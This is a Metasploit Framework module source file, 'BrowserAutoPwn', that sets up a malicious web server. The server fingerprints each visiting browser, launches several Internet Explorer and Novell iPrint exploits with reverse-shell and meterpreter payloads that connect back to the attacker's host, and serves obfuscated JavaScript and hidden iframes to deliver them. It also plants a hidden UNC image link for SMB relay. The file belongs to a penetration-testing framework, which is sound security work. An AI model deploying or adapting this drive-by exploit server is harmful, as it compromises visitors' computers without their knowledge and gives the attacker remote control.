##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##



require 'msf/core'

module Msf

class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
	
	BROWSER_IE = "MSIE"
	BROWSER_FF = "Firefox"
	BROWSER_SAFARI = "Safari"
	OS_LINUX   = "Linux"
	OS_MAC_OSX = "Mac OSX"
	OS_WINDOWS = "Windows"

	include Exploit::Remote::HttpServer::HTML
	include Auxiliary::Report
	
	def initialize(info = {})
		super(update_info(info, 
			'Name'        => 'HTTP Client fingerprinter',
			'Version'     => '$Revision: $',
			'Description' => %q{
				Webbrowser fingerprinter and autoexploiter. 
				},
			'Author'      => 'egypt <egypt@nmt.edu>',
			'License'     => BSD_LICENSE,
			'Actions'     =>
				[
				 	[ 'WebServer' ]
				],
			'PassiveActions' => 
				[
					'WebServer'
				],
			'DefaultAction'  => 'WebServer'))

		register_options([
			OptAddress.new('LHOST', [true, 'Your local IP address ror reverse payloads']),
			OptPort.new('LPORT', [false, 'For reverse payloads; incremented for each exploit', 4444])
			])

		@exploits = Hash.new
	end
	def init_exploit(name)
		case name
		when %r#exploit/windows#
			payload='windows/meterpreter/reverse_tcp'
		else
			payload='generic/shell_reverse_tcp'
		end	
		@exploits[name] = framework.modules.create(name)
		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']

		# for testing, set the exploit uri to the name of the exploit so it's
		# easy to tell what is happening from the browser
		@exploits[name].datastore['URIPATH'] = name  

		@exploits[name].datastore['LPORT']   = @lport
		@exploits[name].datastore['LHOST']   = @lhost
		@exploits[name].exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => 0,
			'Payload'        => payload,
			'RunAsJob'       => true)

		#print_status("#{name} at uri #{@exploits[name].get_resource} with payload #{payload} and lport #{@lport}")
		@lport += 1
	end

	def setup() 
		super
		@lport = datastore['LPORT'] || 4444
		@lhost = datastore['LHOST']
		@lport = @lport.to_i
		print_status("Starting exploit modules...")

		##
		# Start all the exploit modules
		##

		# TODO: add an Automatic target to this guy.
		# For now just use the default target of Mac.
		# requires javascript
		#init_exploit('exploit/multi/browser/firefox_queryinterface')

		# works on iPhone 
		# does not require javascript
		#init_exploit('exploit/osx/armle/safari_libtiff')

		#init_exploit('exploit/osx/browser/software_update')
		#init_exploit('exploit/windows/browser/ani_loadimage_chunksize')
		#init_exploit('exploit/windows/browser/apple_quicktime_rtsp')

		# Works on default IE 5.5 and 6
		# does not require javascript
		init_exploit('exploit/windows/browser/ms03_020_ie_objecttype')

		# requires javascript 
		init_exploit('exploit/windows/browser/novelliprint_getdriversettings');

		# requires javascript 
		#init_exploit('exploit/windows/browser/ms06_055_vml_method')
	
		# Works on default IE 5 and 6
		# requires javascript 
		# requires ActiveXObject('DirectAnimation.PathControl')
		init_exploit('exploit/windows/browser/ms06_067_keyframe')

		# only works on IE with XML Core Services
		# requires javascript
		# requires classid 88d969c5-f192-11d4-a65f-0040963251e5
		init_exploit('exploit/windows/browser/ms06_071_xml_core')

		#init_exploit('exploit/windows/browser/winamp_playlist_unc')

		# requires UNC path which seems to only work on IE in my tests
		#init_exploit('exploit/windows/smb/smb_relay')
	end

	def on_request_uri(cli, request) 
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

		browser_make = nil
		browser_ver  = nil

		ua = request['User-Agent']
		case (ua)
			when /Firefox\/((:?[0-9]+\.)+[0-9]+)/:
				ua_name = BROWSER_FF
				ua_vers  = $1
			when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]\.[0-9]+)/:
				ua_name = BROWSER_IE
				ua_vers  = $1
			when /Version\/(\d+\.\d+\.\d+).*Safari/
				ua_name = BROWSER_SAFARI
				ua_vers  = $1
		end
		case (ua)
			when /Windows/:
				os_name = OS_WINDOWS
			when /Linux/:
				os_name = OS_LINUX
			when /iPhone/
				os_name = OS_MAC_OSX
				os_arch = 'armle'
			when /Mac OS X/
				os_name = OS_MAC_OSX
		end
		case (ua)
			when /PPC/
				os_arch = 'ppc'
			when /i.86/
				os_arch = 'x86'
		end

		os_name ||= 'Unknown'

		print_status("Browser claims to be #{ua_name} #{ua_vers}, running on #{os_name}")
		report_note(
			:host => cli.peerhost,
			:type => 'http_request',
			:data => "#{os_name} #{os_arch} #{ua_name} #{ua_vers}"
		)

		response = create_response()

		case request.uri
		when datastore['URIPATH']:
			# TODO: consider having a javascript timeout function that writes
			# each exploit's iframe so they don't step on each other.

			# for smb_relay
			windows_html = %Q{
				<div id="windows">
					<img src="\\\\#{@lhost}\\public\\#{Rex::Text.rand_text_alpha(15)}.jpg" style="visibility:hidden" height="1px" width="1px" />
				</div>
				}
			#osx_html = %Q{
			#	<div id="osx">
			#		<iframe src="#{@exploits['exploit/osx/armle/safari_libtiff'].get_resource}" 
			#		style="visibility:hidden" height="1px" width="1px" border="none"
			#		></iframe>'+
			#	</div>
			#	}

			var_onload_func = Rex::Text.rand_text_alpha(8)
			objects = { 
				'DirectAnimation.PathControl'            => @exploits['exploit/windows/browser/ms06_067_keyframe'].get_resource, 
				'{88d969c5-f192-11d4-a65f-0040963251e5}' => @exploits['exploit/windows/browser/ms06_071_xml_core'].get_resource,
				'{36723F97-7AA0-11D4-8919-FF2D71D0D32C}' => @exploits['exploit/windows/browser/novelliprint_getdriversettings'].get_resource,
				}
			hash_declaration = objects.map{ |k, v| "'#{k}', '#{v}'," }.join
			hash_declaration = hash_declaration[0,hash_declaration.length-1]

			script = <<ENDJS
// stolen from http://www.mojavelinux.com/articles/javascript_hashes.html
function Hash()
{
	this.length = 0;
	this.items = new Array();
	for (var current_item = 0; current_item < arguments.length; current_item += 2) {
		if (typeof(arguments[current_item + 1]) != 'undefined') {
			this.items[arguments[current_item]] = arguments[current_item + 1];
			this.length++;
		}
	}
}

function BodyOnLoad() {
	var vuln_obj = null;
	var body_elem = document.getElementById('body_id');
	// object_list contains key-value pairs like 
	//        {classid} => /path/to/exploit/for/classid
	//   and
	//        ActiveXname => /path/to/exploit/for/ActiveXname
	var object_list = new Hash(#{hash_declaration});

	if (navigator.userAgent.indexof("MSIE") != -1) {
		// iterate through our list of exploits 
		for (var current_item in object_list.items) {
			// classids are stored surrounded in braces for an easy way to tell 
			// them from ActiveX object names, so if it has braces, strip them 
			// out and create an object element with that classid
			if (current_item.substring(0,1) == '{') {
				obj_element = document.createElement("object");
				obj_element.setAttribute("cl" + "as" + "sid", "cl" + "s" + "id" +":" + current_item.substring( 1, current_item.length - 1 ) ) ;
				obj_element.setAttribute("id", current_item);
				body_elem.appendChild(obj_element);
				vuln_obj = document.getElementById(current_item);
			} else {
				// otherwise, try to create an AXO with that name
				try { vuln_obj = new ActiveXObject(current_item); } catch(e){}
			}
			if (vuln_obj) {
				body_elem.innerHTML += '<p>' + object_list.items[current_item] + '</p>';
				//body_elem.innerHTML += '<iframe src="'+ 
				//	object_list.items[current_item] +
				//	'" style="visibility:hidden" height="1px" width="1px" border="none"></iframe>';
			}
			vuln_obj = null;
		}
	}
}
ENDJS
			js = Rex::Exploitation::ObfuscateJS.new(script)
			js.obfuscate(
				'Symbols' => { 
					'Variables' => [ 'object_list', 'obj_element', 'vuln_obj', 'body_elem', 'body_id', 'current_item', 'Hash', 'items', 'BodyOnLoad' ]
				}
			)
			body = <<ENDHTML
<body id="#{js.sym('body_id')}" onload="#{js.sym('BodyOnLoad')}()">
<h1>Please wait while we connect you...</h1>
<!--[if lt IE 7]>
<iframe src="#{@exploits['exploit/windows/browser/ms03_020_ie_objecttype'].get_resource}" 
	style="visibility:hidden" height="1px" width="1px" border="none"	
></iframe>
<![endif]-->
ENDHTML
			#body << " <!--[if IE ]> "
			#objects.each { |k,v|
			#	body << "<object classid=\"clsid:#{k[1,k.length-1]}\" id=\"#{k}\"></object>\n";
			#}
			#body << " <![endif]--> "

			response.body = ' <html> <head> <title> Loading </title> '
			response.body << ' <script language="javascript">' + script + ' </script> </head> ' + body 

			if (os_name == OS_WINDOWS)
				response.body << windows_html
			end
			if (os_name == OS_MAC_OSX)
				response.body << osx_html
			end
			response.body << "</body></html>"
			response.body = Rex::Text.randomize_space(response.body)
		else
			print_error("I don't know how to handle that request #{request.uri}, sending 404")
			send_not_found(cli)
			return false
		end
		response['Expires'] = '0'
		response['Cache-Control'] = 'must-revalidate'

		cli.send_response(response)
	end

	def run
		exploit()
	end

end
end

=begin
=end
